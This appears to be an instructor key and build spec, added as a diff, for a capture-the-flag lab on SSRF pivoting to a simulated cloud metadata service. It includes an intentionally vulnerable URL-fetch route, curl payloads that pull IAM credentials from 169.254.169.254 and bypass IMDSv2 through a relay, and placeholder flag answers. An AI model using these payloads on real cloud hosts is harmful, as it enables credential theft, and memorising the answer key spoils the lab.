@@ -1,0 +1,144 @@
+# Module 3 — Lab 2: SSRF → Cloud Instance Metadata Service (IMDS) — Instructor Key
+
+> **⚠️ PLANNED CONTENT — not yet built.** Build spec, written implementation-ready.
+> Flag values below are placeholders generated at planning time (see Lab 1
+> InstructorKey banner for the reuse-or-regenerate note — same applies here).
+
+Extends `/opt/soulsecure-labs/apps/api_app.py` (the `api` container) with two new
+routes, plus a **new container** (`imds-sim`) assigned a static IP on a dedicated
+internal-only bridge network so it's reachable at the real `169.254.169.254` address
+from inside `api`'s network namespace — and only from there. Plus a **second new
+container** (`config-service`) reachable only by its Docker Compose service name,
+demonstrating SSRF pivoting to internal services generally, not just cloud metadata.
+
+## New `api` routes (ground truth, to implement)
+
+| Method | Path | Behavior | Notes |
+|---|---|---|---|
+| GET | `/api/v2/status` | Extend existing changelog text to mention: `"v2.1 (beta): integrations webhook preview — POST /api/v2/integrations/fetch-preview"` | Discovery hook, same pattern as M2 Lab 3's v1→v2 deprecation-notice hook |
+| POST | `/api/v2/integrations/fetch-preview` | Body `{"url": "<url>"}`. Server performs a `GET` (method fixed, no custom headers) against that URL and returns `{"status_code":..., "content_type":..., "body_preview": "<first 2000 chars>"}` | The core SSRF primitive — no allowlist/denylist on the URL (the vulnerability) |
+| POST | `/api/v2/integrations/webhook-relay` | Body `{"url":..., "method": "GET"\|"PUT"\|"POST", "headers": {...}}`. Same response shape, but forwards method + arbitrary headers | Harder-mode discovery only — **not** linked from `/api/v2/status`; surfaced via a hint string inside `fetch-preview`'s error response when it's given a URL IMDS itself would reject with 401 (e.g. include text like `"hint": "for full method/header control see /api/v2/integrations/webhook-relay (internal use only)"` in that specific error case) |
+
+## New container: `config-service` (Flag 1 target)
+
+Docker Compose service name `config-service`, no published port mapping, no vhost, no
+DNS record — reachable only by other containers on the same Compose network using
+Docker's built-in service-name DNS.
+
+```
+GET http://config-service:8500/
+→ 200, JSON: {"service": "soulsecure-internal-config", "env": "prod",
+   "db_host": "orders-db.internal.soulsecure.lab", "flag": "flag{8124333151ec60d870737fc1a5b60b4c}"}
+```
+
+## New container: `imds-sim` (Flags 2–4 target)
+
+Assigned the static IP `169.254.169.254` on a small dedicated bridge network
+(`172.30.169.0/24`-style custom subnet configured to also route `169.254.169.254`
+internally — see "File locations" for the compose-level detail to work out) that only
+`api` joins. Not reachable from the student's attack box under any circumstances —
+verify this explicitly during build (attempting `curl 169.254.169.254` directly from
+outside the Docker host must fail/timeout).
+
+| Path | Method | Auth | Response | Notes |
+|---|---|---|---|---|
+| `/latest/meta-data/` | GET | none | Plaintext listing: `instance-id\nlocal-ipv4\niam/\nplacement/` | |
+| `/latest/meta-data/instance-id` | GET | none | `i-0a1b2c3d4e5f6g7h8` | |
+| `/latest/user-data` | GET | none | Fake cloud-init bootstrap script (bash), containing a hardcoded `WEBHOOK_SIGNING_SECRET=...` env export **and**, separately, a comment: `# TODO: migrate this instance to soulsecure-deploy-role once IAM cleanup lands — ticket flag{b718ed8571792e378f2fa92f9cad0307}` | **Flag 2**. The `TODO` comment is also the discovery hook for the second role name used in Flag 4 |
+| `/latest/meta-data/iam/security-credentials/` | GET | none | `soulsecure-app-role` | Deliberately **not** token-gated — see Known Limitations |
+| `/latest/meta-data/iam/security-credentials/soulsecure-app-role` | GET | none | `{"Code":"Success","LastUpdated":"2026-01-01T00:00:00Z","Type":"AWS-HMAC","AccessKeyId":"ASIASOULSECUREAPP01","SecretAccessKey":"<value>","Token":"<value>","Expiration":"2026-01-01T06:00:00Z","flag":"flag{6734732f699ecc94c94afcefd08d3fb5}"}` | **Flag 3**. `AccessKeyId`/`SecretAccessKey`/`Token` are real values this environment's later services should accept — this is the credential set that should carry forward into Module 4 |
+| `/latest/api/token` | PUT | requires header `X-aws-ec2-metadata-token-ttl-seconds` (any int) | Returns an opaque random token string, plaintext body | IMDSv2 session token mint |
+| `/latest/meta-data/iam/security-credentials/soulsecure-deploy-role` | GET | requires header `X-aws-ec2-metadata-token: <valid token>` — without it, `401` + body `{"error": "IMDSv2 token required"}` | `{"Code":"Success", ..., "AccessKeyId":"ASIASOULSECUREDEPLOY02","SecretAccessKey":"<value>","Token":"<value>","Expiration":"...","flag":"flag{9c0a12db183b624beaae1a8e4f2bc608}"}` | **Flag 4** (harder mode). This role's credentials should be scoped **broader** than `soulsecure-app-role` once Module 4's `iam-sim` exists — narrative setup for "the second cred set is the real prize" |
+
+`soulsecure-deploy-role` is intentionally **not listed** by
+`/latest/meta-data/iam/security-credentials/` (role enumeration only shows
+`soulsecure-app-role`) — the only way to learn the second role's name is the user-data
+comment (Flag 2's location doing double duty as a discovery hook).
+
+## Flags (ground truth — placeholder values, see banner)
+
+| Flag | Location | Value |
+|---|---|---|
+| Flag 1 | `config-service:8500/` via `fetch-preview` SSRF | `flag{8124333151ec60d870737fc1a5b60b4c}` |
+| Flag 2 | `169.254.169.254/latest/user-data` via `fetch-preview` SSRF | `flag{b718ed8571792e378f2fa92f9cad0307}` |
+| Flag 3 | `169.254.169.254/latest/meta-data/iam/security-credentials/soulsecure-app-role` via `fetch-preview` SSRF | `flag{6734732f699ecc94c94afcefd08d3fb5}` |
+| Flag 4 (harder mode) | `169.254.169.254/latest/meta-data/iam/security-credentials/soulsecure-deploy-role` via `webhook-relay` SSRF, after `PUT /latest/api/token` through the same relay | `flag{9c0a12db183b624beaae1a8e4f2bc608}` |
+
+## Verification commands (once built)
+
+```bash
+curl -sk https://api.soulsecure.lab/api/v2/status | grep -i integrations
+
+curl -sk -X POST https://api.soulsecure.lab/api/v2/integrations/fetch-preview \
+  -H 'Content-Type: application/json' -d '{"url":"http://config-service:8500/"}'   # Flag 1
+
+curl -sk -X POST https://api.soulsecure.lab/api/v2/integrations/fetch-preview \
+  -H 'Content-Type: application/json' -d '{"url":"http://169.254.169.254/latest/user-data"}'   # Flag 2
+
+curl -sk -X POST https://api.soulsecure.lab/api/v2/integrations/fetch-preview \
+  -H 'Content-Type: application/json' \
+  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/soulsecure-app-role"}'   # Flag 3
+
+# Harder mode: PUT the token via webhook-relay, then GET the deploy-role creds with it
+curl -sk -X POST https://api.soulsecure.lab/api/v2/integrations/webhook-relay \
+  -H 'Content-Type: application/json' \
+  -d '{"url":"http://169.254.169.254/latest/api/token","method":"PUT","headers":{"X-aws-ec2-metadata-token-ttl-seconds":"21600"}}'
+# take the returned token, then:
+curl -sk -X POST https://api.soulsecure.lab/api/v2/integrations/webhook-relay \
+  -H 'Content-Type: application/json' \
+  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/soulsecure-deploy-role","method":"GET","headers":{"X-aws-ec2-metadata-token":"<token>"}}'   # Flag 4
+```
+
+## Grading rubric (out of 100, proposed)
+
+| Criterion | Points |
+|---|---|
+| Discovered `/api/v2/integrations/fetch-preview` via the status changelog | 10 |
+| Confirmed genuine server-side fetch behavior before assuming exploitability | 10 |
+| Pivoted to `config-service` (internal, non-cloud-metadata target) | 15 |
+| Reached IMDS and correctly explained why `169.254.169.254` is significant | 10 |
+| Extracted and correctly read the `/latest/user-data` leak (both the secret and the migration TODO) | 15 |
+| Retrieved working `soulsecure-app-role` credentials | 15 |
+| Found and used `/api/v2/integrations/webhook-relay` to defeat IMDSv2 and retrieve `soulsecure-deploy-role` credentials | 20 |
+| Clean deliverable table with correct severity framing | 5 |
+
+## Design notes / narrative threads
+
+- `soulsecure-app-role` vs. `soulsecure-deploy-role` is the deliberate two-tier
+  credential setup for this lab — matches Module 3's overall goal of leaving students
+  with *multiple* credential sets of differing, unresolved privilege by the end of
+  the module. Keep both distinct and functional; do not let one subsume the other.
+- The user-data leak doing double duty (contains both a usable secret **and** the
+  name of the harder-mode target) rewards students who read output fully instead of
+  pattern-matching for "the flag" and moving on — consistent with the "read source,
+  don't just eyeball" ethos already established in Module 2.
+- `config-service` exists specifically so this lab isn't *only* about cloud metadata
+  — real SSRF findings in the field are just as often about reaching an internal
+  admin panel, database, or service-discovery endpoint as they are about IMDS.
+
+## File locations (proposed)
+
+- `/opt/soulsecure-labs/apps/api_app.py` — add the two new routes
+- `/opt/soulsecure-labs/apps/imds_sim.py` (new) + Dockerfile/service entry
+- `/opt/soulsecure-labs/apps/config_service.py` (new, small) + Dockerfile/service entry
+- `docker-compose.yml` — add both new services; `imds-sim` needs a dedicated network
+  block with a fixed IP. Docker Compose supports assigning a static IP within a
+  custom network's subnet via `networks.<name>.ipv4_address` — the subnet chosen for
+  this network needs to include `169.254.169.254`. **Verify this actually works
+  cleanly** on the target Docker version/bridge driver before committing to this
+  approach at build time; if static-IP assignment in the 169.254.0.0/16 link-local
+  range proves unreliable, fall back to a `dnsmasq`/hosts-alias trick so that only
+  containers on `api`'s network resolve `169.254.169.254` to `imds-sim`'s real IP
+  (still invisible/unreachable from the student's attack box either way).
+
+## Known limitations
+
+- Simplified IMDSv2 gating (only the second role is token-gated) — flagged in the
+  StudentGuide too. Don't present this lab's exact behavior as a literal IMDSv2
+  reference.
+- `fetch-preview`/`webhook-relay` are minimal SSRF primitives (no redirect-following,
+  no DNS-rebinding simulation) — sufficient for this lab's teaching goals, not a
+  general SSRF-technique showcase. If a future revision wants to teach SSRF filter
+  bypass techniques specifically (decimal/hex IP encoding, redirect chains), that's a
+  separate harder-mode variant to design later, not layered into this lab's already
+  two-stage harder mode.
